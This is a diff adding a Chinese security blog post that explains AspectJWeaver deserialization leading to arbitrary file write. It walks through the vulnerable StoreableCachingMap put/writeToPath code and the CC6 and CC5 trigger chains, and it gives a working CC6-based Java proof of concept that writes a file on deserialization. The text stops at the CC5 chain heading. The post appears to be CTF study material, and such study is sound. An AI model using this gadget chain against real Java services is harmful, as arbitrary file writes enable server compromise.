@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="Aspectjweaver反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aspectjweaver反序列化至任意文件写入">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BAspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%87%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="Aspectjweaver反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260228115752868.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260228122826560.png">
+<meta property="article:published_time" content="2026-02-28T03:36:00.000Z">
+<meta property="article:modified_time" content="2026-02-28T04:35:51.965Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260228115752868.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BAspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%87%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BAspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%87%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","path":"2026/02/28/Java反序列化之Aspectjweaver反序列化至任意文件写入/","title":"Aspectjweaver反序列化至任意文件写入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Aspectjweaver反序列化至任意文件写入 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B"><span class="nav-number">2.</span> <span class="nav-text">介绍一下</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96"><span class="nav-number">3.</span> <span class="nav-text">依赖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleCache-StoreableCachingMap-put"><span class="nav-number">4.1.</span> <span class="nav-text">SimpleCache$StoreableCachingMap#put()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CC6%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">CC6触发链</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CC6-AspectJWeaver-POC"><span class="nav-number">6.</span> <span class="nav-text">CC6+AspectJWeaver POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CC5%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="nav-number">7.</span> <span class="nav-text">CC5触发链</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CC5-AspectJWeaver-POC"><span class="nav-number">8.</span> <span class="nav-text">CC5+AspectJWeaver POC</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">189</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BAspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%87%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Aspectjweaver反序列化至任意文件写入 | root@wanth3f1ag">
+      <meta itemprop="description" content="Aspectjweaver反序列化">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Aspectjweaver反序列化至任意文件写入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-28 11:36:00 / 修改时间：12:35:51" itemprop="dateCreated datePublished" datetime="2026-02-28T11:36:00+08:00">2026-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">Aspectjweaver反序列化</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实这个之前就做过了，在PolarCTF的《一写一个不吱声》这道题中就是专门介绍了Aspectjweaver导致任意文件写入的问题，不过这里的话主要是想整合一下学过的链子看看如何触发Aspectjweaver的任意文件写入</p>
+<h1 id="介绍一下"><a href="#介绍一下" class="headerlink" title="介绍一下"></a>介绍一下</h1><p>AspectJWeaver 是 AspectJ 框架里的一个核心组件，用于实现 <strong>AOP（面向切面编程）</strong>的字节码织入功能。它是一个 Java 代理&#x2F;库，能够将”切面”（Aspect）代码自动插入到目标类的字节码中，让你在不修改原有业务代码的情况下，添加横切关注点（如日志、事务、权限检查等）。</p>
+<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>先导入AspectJWeaver的依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>另外还需要导入CC的依赖，我这里是commons-collections3.2.1</p>
+<h1 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h1><p>首先看看AspectJWeaver导致任意文件写入的地方</p>
+<h2 id="SimpleCache-StoreableCachingMap-put"><a href="#SimpleCache-StoreableCachingMap-put" class="headerlink" title="SimpleCache$StoreableCachingMap#put()"></a>SimpleCache$StoreableCachingMap#put()</h2><p>来到<code>org.aspectj.weaver.tools.cache.SimpleCache</code>中内部类<code>StoreableCachingMap</code> 的 put 函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StoreableCachingMap</span> <span class="keyword">extends</span> <span class="title class_">HashMap</span>&#123; </span><br><span class="line">          </span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SAME_BYTES_STRING</span> <span class="operator">=</span> <span class="string">&quot;IDEM&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] SAME_BYTES = SAME_BYTES_STRING.getBytes();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="type">byte</span>[] valueBytes = (<span class="type">byte</span>[]) value;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123;</span><br><span class="line">			path = SAME_BYTES_STRING;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			path = writeToPath((String) key, valueBytes);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.put(key, path);</span><br><span class="line">		storeMap();</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">		trace.error(<span class="string">&quot;Error inserting in cache: key:&quot;</span>+key.toString() + <span class="string">&quot;; value:&quot;</span>+value.toString(), e);</span><br><span class="line">		Dump.dumpWithException(e);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个类是继承了HashMap类的，并且内部重写了put方法</p>
+<p>这段代码主要是会将键值对添加到映射中，会检查value字节数组中是否有SAME_BYTES标记，这个标记表示是否是重复的字节数据。</p>
+<p>随后根据这个标记去确定写入文件的路径是”IDEM”还是通过writeToPath函数把字节数据写入磁盘，并返回文件路径</p>
+<p>最终会将键和文件路径写入一个HashMap对象中添加映射，并调用storeMap方法将映射数据存储到持久化存储中，最后返回result</p>
+<p>我们跟进writeToPath看看</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">writeToPath</span><span class="params">(String key, <span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">fullPath</span> <span class="operator">=</span> folder + File.separator + key;</span><br><span class="line">	<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fullPath);</span><br><span class="line">	fos.write(bytes);</span><br><span class="line">	fos.flush();</span><br><span class="line">	fos.close();</span><br><span class="line">	<span class="keyword">return</span> fullPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是一个将字节数据写入文件的操作，fullPath是将缓存目录和key文件名拼接后的最终文件路径，关键点就在于这里是拼接且无过滤的</p>
+<p>可以看看folder是如何赋值的</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260228115752868.png" alt="image-20260228115752868"></p>
+<p>构造函数中有folder的赋值</p>
+<p>然后如何触发这里的put方法呢？想必这个就有很多方法了，最常见的就是LazyMap#get方法</p>
+<p>LazyMap#get()触发put</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的value文件内容由factory.transform方法返回，我们可以用之前CC1讲过的ConstantTransformer去操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">	<span class="built_in">super</span>();</span><br><span class="line">	iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于如何触发LazyMap#get方法，CC6和CC5就有讲过了</p>
+<h1 id="CC6触发链"><a href="#CC6触发链" class="headerlink" title="CC6触发链"></a>CC6触发链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()-&gt;</span><br><span class="line">    HashMap#hash()-&gt;</span><br><span class="line">    	TiedMapEntry#hashCode()-&gt;</span><br><span class="line">    	TiedMapEntry#getvalue()-&gt;</span><br><span class="line">    		LazyMap#get()-&gt;</span><br><span class="line">    			SimpleCache$StoreableCachingMap#put()</span><br></pre></td></tr></table></figure>
+
+<h1 id="CC6-AspectJWeaver-POC"><a href="#CC6-AspectJWeaver-POC" class="headerlink" title="CC6+AspectJWeaver POC"></a>CC6+AspectJWeaver POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.AspectJWeaverPOC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SerializeChains.Gedget.Gadgets;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AspectJWeaver_CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取一个StoreableCachingMap实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> c.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">storeableCachingMap</span> <span class="operator">=</span> (HashMap) ctor.newInstance(<span class="string">&quot;E:\\java\\JavaSec\\JavaSerialize&quot;</span>,<span class="number">1</span>);<span class="comment">//第一个是文件夹，第二个任意数字即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造文件内容通过 ConstantTransformer.transform返回</span></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;wanth3f1ag&quot;</span>.getBytes(StandardCharsets.UTF_8));<span class="comment">//由于文件内容value需要为字节数组，所以需要转化一下</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成LazyMap对象并传给TiedMapEntry</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(storeableCachingMap,constantTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//put放入readObject中的key，其中也会触发hashCode</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Gadgets.serialize(hashmap,<span class="string">&quot;AspectJWeaver_CC6.txt&quot;</span>);</span><br><span class="line">        Gadgets.unserialize(<span class="string">&quot;AspectJWeaver_CC6.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260228122826560.png" alt="image-20260228122826560"></p>
+<h1 id="CC5触发链"><a href="#CC5触发链" class="headerlink" title="CC5触发链"></a>CC5触发链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject()-&gt;</span><br><span class="line">    TiedMapEntry#toString()-&gt;</span><br><span class="line">    TiedMapEntry#getvalue()-&gt;</span><br><span class="line">        LazyMap#get()-&gt;</span><br><span class="line">            SimpleCache$StoreableCachingMap#put()</span><br></pre></td></tr></table></figure>
+
